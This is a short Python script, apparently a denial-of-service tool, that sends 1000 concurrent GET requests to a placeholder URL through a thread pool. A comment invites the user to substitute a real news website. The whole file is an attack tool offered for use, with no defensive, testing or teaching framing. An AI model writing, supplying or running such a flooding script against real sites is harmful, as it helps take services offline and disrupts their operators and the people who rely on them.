import requests
from concurrent.futures import ThreadPoolExecutor

def ddos_attack(url, num_requests):
    def send_request():
        try:
            response = requests.get(url)
            print(f"Request sent to {url}, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        for _ in range(num_requests):
            executor.submit(send_request)

if __name__ == "__main__":
    target_url = "http://example-news-website.com"  # Replace with the target news website URL
    number_of_requests = 1000  # Number of requests to send

    ddos_attack(target_url, number_of_requests)

